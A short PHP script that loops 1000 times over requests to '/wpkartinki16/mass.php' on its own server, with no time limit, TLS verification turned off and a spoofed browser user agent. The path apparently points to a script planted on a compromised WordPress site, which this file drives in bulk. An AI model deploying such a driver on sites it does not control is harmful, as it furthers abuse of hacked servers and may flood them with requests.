<?php
set_time_limit(0);

for($i=0;$i<1000;$i++) {
		my_Curl('http://'.$_SERVER['SERVER_NAME'].'/wpkartinki16/mass.php');
}		

  function my_Curl($url, $browsers='Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.3)')
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL , $url);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_REFERER, true);
        //curl_setopt($ch, CURLOPT_COOKIE, 1);
        //curl_setopt($ch, CURLOPT_COOKIESESSION, TRUE);
        curl_setopt($ch, CURLOPT_USERAGENT , $browsers);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER , true);
        //curl_setopt($ch, CURLOPT_FOLLOWLOCATION , true);
        $file = curl_exec($ch);
        curl_close($ch);
        
        return $file;
    }
    
?>
